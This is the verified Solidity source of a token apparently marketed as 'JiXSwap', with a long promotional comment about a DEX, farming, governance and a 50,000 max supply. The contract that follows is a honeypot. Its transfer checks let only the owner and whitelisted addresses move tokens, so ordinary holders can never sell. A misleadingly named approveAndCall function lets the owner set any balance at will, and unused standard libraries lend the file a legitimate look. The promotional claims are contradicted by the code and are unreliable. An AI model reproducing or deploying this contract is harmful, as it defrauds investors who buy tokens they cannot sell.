/**
 *Submitted for verification at Etherscan.io on 2021-04-11
*/

/*
What is JiX Swap?

JiXSwap is a decentralized exchange for swapping ERC-20 tokens.
Multi-chain support is planned for the next releases which is shown on the roadmap.
We built a platform for The crypto trading Industry
JiXSwap uses an automated market maker (AMM) model. That means that while you can trade digital assets on the platform, there isn’t an order book where you’re matched with someone else. Instead, you trade against a liquidity pool.
Those pools are filled with other users’ funds. They deposit them into the pool, receiving liquidity provider (or LP) tokens in return. They can use those tokens to reclaim their share, plus a portion of the trading fees.
JiXSwap Features
JiXSwap allows users to be Liqiudity Provider, Farming, Staking, Exchange, Bridging Assets across chains and more…
Liqiudity Provider
Pools are filled with other users’ funds. They deposit them into the pool, receiving liquidity provider (or LP) tokens in return. They can use those tokens to reclaim their share, plus a portion of the trading fees.
Farming
On the farm, you can deposit your LP tokens, locking them up in a process that rewards you with JIX. Which LP tokens can you deposit? Well, the list is quite long, but here’s a taster of some of the most popular ones.
Staking
JiXSwap allows you to stake its governance token. — JIX
You’ll earn a proportion of JIX token with every new BSC blocks.
Exchange
JiXSwap is an automated market maker (AMM) is a type of decentralized exchange (DEX) protocol that relies on a mathematical formula to price assets. Instead of using an order book like a traditional exchange, assets are priced according to a pricing algorithm.
Bridging Assets
Cross-chain bridging service that aims to increase interoperability between different blockchains. It essentially lets anyone convert selected coins into wrapped tokens (or “pegged tokens”) across chains. i.e. ERC20-BEP20
JiXSwap Roadmap
It’s a to-do list with particular timeline. We will work hard to release roadmap items before deadline.

JiX Swap Token (JIX)
JIX TOKEN
Contract Address: 
Name: JiX Swap Token
Ticker: JIX
Decimals: 18
Max supply: 50,000
JIX Liquidity Mining and Burn Rates
Emission Rate: 0.75 JIX/block or 21600 JIX/day [may change in future]
Block Reward: Current block reward is 0.75 JIX. [may change in future] 
•  To preserve JIX Token value, we decided to burn 2000*(Block Reward) JIX Token every day.
•  Nearly 9.09% of the total produced JIX will be sent to the deployer address for marketing&burning. The rest will be distributed among farms&pools on our platform.
•  The team will not sell or farm any JIX token. The amount accumulates on the deployer address will be used only for marketing, contents&competitions and future airdrop. The only income for the developer team is deposit fees.
Importance of unique inflation control mechanism:
•  Allocating this budget for marketing instead of buyback will help us grow & expand, hence, increasing coin value much more compared to buybacks.
•  Income from deposit fees is negligible compared to the size of JIX/ETH and JIX/USDT pools. As a result of this, the value increase of JIX after the buyback will also negligible.
•  Buyback can backfire since times of buybacks can create a pump/dump environment, and like said in the second argument, the value increase of the token is negligible due to the high volume of pools.
Deposit Fees
Standard deposit fee is 4% across all NON-JIX farms and pools. For JIX farms and pools, there is no deposit fee (0%). 50% of the deposit fee will be distributed among developers, the other 50% will be used for mainly marketing, buyback, and other expenses such as airdrops, contests, maintenance, etc. 
JIX as a Governance Token
JIX is the native governance token of JiX Swap. We are advocates of decentralized platforms, because of this, we will lead our platform to success with our community. The community uses this platform and the community will lead this platform.
Our governance model is explained on Governance. As said there, after compulsory developments are being done, we will give control to our community.

Governance
Since our platform is decentralized, after the core development updates, we will give control to our community. Any JIX governance token holders may propose a change, update or development via our governance portal. Our governance structure will be like this:
First, any community member will propose their suggestion in our Discord channel’ #issues, then our community will talk upon this issue in Discord and Telegram. If this issue is agreed upon, the team will carry this proposal to the project page on Snapshot or Aragon.(the original issue can be amended before going to Snapshot page) When a proposal listed on Snapshot, those who hold JIX can vote either yes or no.
If the majority of JIX holders vote yes, then the team will execute the proposal. 
If the majority of JIX holders vote no, then the team will not take action upon this proposal. 
Any failed proposal can be talked upon in our socials, but they can be issued again after 2 weeks.
*/
pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract JiXSwap {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}